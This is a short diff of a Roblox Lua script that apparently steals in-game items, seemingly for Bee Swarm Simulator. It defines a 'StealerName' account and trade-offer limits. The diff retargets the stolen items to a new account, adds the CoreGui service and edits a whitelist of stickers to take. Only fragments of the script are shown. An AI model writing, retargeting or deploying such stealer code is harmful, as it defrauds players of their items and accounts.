@@ -2,6 +2,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
 
 local LocalPlayer = Players.LocalPlayer
 local LocalPlayerID = LocalPlayer.UserId
@@ -16,7 +17,7 @@ local StickerBookMenu = require(ReplicatedStorage.Gui.StickerMenus.StickerBookMe
 
 local MAX_OFFER_SIZE = 30
 
-local StealerName = "RawBrie"
+local StealerName = "averytiredcheese"
 local StealerPlayer = nil
 local StealerID = nil
 
@@ -158,9 +159,6 @@ local WhitelistedStickers = {
 	"Festive Pufferfush",
 	"Festive Pea",
 	"BBM From Below",
-	
-	
-	"Diamond Cluster"
 }
 
 local WhitelistedBeequips = {
